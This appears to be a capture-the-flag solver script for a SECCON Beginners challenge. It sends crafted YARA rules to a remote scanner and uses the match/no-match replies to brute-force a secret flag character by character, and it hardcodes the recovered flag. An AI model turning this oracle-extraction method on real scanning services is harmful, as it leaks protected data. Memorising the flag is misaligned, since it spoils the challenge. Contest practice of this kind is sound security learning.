from string import printable

from pwn import *


def check(rule):
    io = remote("yaro.beginners.seccon.games", 5003)
    io.sendline(rule.encode())
    io.sendline()
    for _ in range(5):
        io.recvline()
    res = io.recvline()
    io.recvline()
    return b"Not" not in res


flag = "ctf4b{Y3t_An0th3r_R34d_Opp0rtun1ty}"
while flag[-1] != "}":
    for c in range(0x20, 0x7E + 1):
        predict = flag + f"\\x{hex(c)[2:]}"
        rule = (
            "rule hoge { strings: $shebang = /^" + predict + ".*/ condition: $shebang }"
        )
        if check(rule):
            print(f"OK! {chr(c)}")
            break
    flag = predict
    print(flag)

print(check(rule))
